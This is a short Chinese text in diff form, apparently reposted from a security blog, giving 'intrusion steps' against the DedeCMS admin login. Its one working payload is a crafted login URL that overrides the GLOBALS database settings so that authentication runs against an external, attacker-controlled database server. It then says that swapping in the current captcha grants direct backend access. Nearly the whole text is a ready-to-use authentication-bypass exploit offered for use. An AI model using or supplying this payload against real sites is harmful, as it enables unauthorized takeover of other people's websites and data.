@@ -1,0 +1,9 @@
+
+入侵步骤如下：
+
+http://www.xx.com/织梦网站后台/login.php?dopost=login&validate=dcug&userid=admin&pwd=inimda&_POST[GLOBALS][cfg_dbhost]=116.255.183.90&_POST[GLOBALS][cfg_dbuser]=root&_POST[GLOBALS][cfg_dbpwd]=r0t0&_POST[GLOBALS][cfg_dbname]=root
+
+把上面黑底黄字上的字母改为当前的验证码，即可直接进入网站后台。
+本文来源于独自等待博客：http://www.waitalone.cn/ 原文地址：http://www.waitalone.cn/post/939.html 
+
+
